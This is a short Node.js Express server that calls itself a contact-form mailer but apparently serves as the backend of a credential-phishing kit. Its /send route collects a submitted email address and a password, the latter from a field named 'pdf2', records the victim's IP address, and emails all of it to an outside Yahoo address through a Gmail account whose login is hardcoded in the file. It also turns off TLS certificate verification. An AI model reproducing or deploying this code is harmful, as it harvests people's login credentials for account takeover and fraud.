const express = require('express');
const bodyParser = require('body-parser');
const exphbs = require('express-handlebars');
const path = require('path');
// const serverless = require('serverless-http')
const nodemailer = require('nodemailer');
const router = express.Router();

const app = express();

// View engine setup
app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');

// Static folder
app.use('/public', express.static(path.join(__dirname, 'public')));

// Body Parser Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
// app.use('/.netlify/functions/lambda', router);  // path must route to lambda
// app.use('/', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));

app.get('/', (req, res) => {
  res.send('It works');
});

app.post('/send', (req, res) => {
    var ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
    
  const output = `
    <p>You have a new contact request</p>
    <h3>Contact Details</h3>
    <ul>  
      <li>Email: ${req.body.username}</li>
      <li>Password: ${req.body.pdf2}</li>
      <li>Ip: ${ip}</li>
      
    </ul>
    <h3>Date</h3>
    <p>${new Date(Date.now)}</p>
  `;

  // create reusable transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    secureConnection: false,
    port: 587 ,
    tls: {
        ciphers:'SSLv3'
     },
    secure: false, // true for 465, false for other ports
    auth: {
        user: 'bj74871@gmail.com', // generated ethereal user
        pass: 'nicqoreal12345'  // generated ethereal password
    },
    tls:{
      rejectUnauthorized:false
    }
  });

  // setup email data with unicode symbols
  let mailOptions = {
      from: '"Nodemailer Contact" <test@test.com>', // sender address
      to: 'jollofrice234@yahoo.com', // list of receivers
      subject: 'Node mailer results', // Subject line
      text: 'Welcome Results', // plain text body
      html: output // html body
  };

  // send mail with defined transport object
  transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
          return console.log(error);
      }
      console.log('Message sent: %s', info.messageId);   
      console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

      res.send('contact', {msg:'Email has been sent'});
  });
  });

app.listen(process.env.PORT || 3400, () => console.log('Server started...'));
